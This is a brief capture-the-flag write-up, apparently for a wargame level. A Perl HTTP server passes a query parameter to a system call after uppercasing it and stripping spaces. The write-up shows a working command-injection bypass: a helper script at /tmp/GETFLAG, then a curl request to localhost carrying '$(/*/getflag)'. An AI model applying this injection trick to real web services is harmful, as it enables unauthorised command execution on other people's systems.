In the home directory you will find a perl script, assuming that this script is runing in the background, we will have an http server with a system call that we can exploit, the only problem is that the parameter given to this system call is previously modified, making all characters uppercase, and triming all the spaces, so one work around can be this:

``` shell
echo "getflag > /tmp/flag" > /tmp/GETFLAG;
chmod +x /tmp/GETFLAG;
curl http://localhost:4646/?x='$(/*/getflag)'&y='';
```

``` shell
cat /tmp/flag;
```

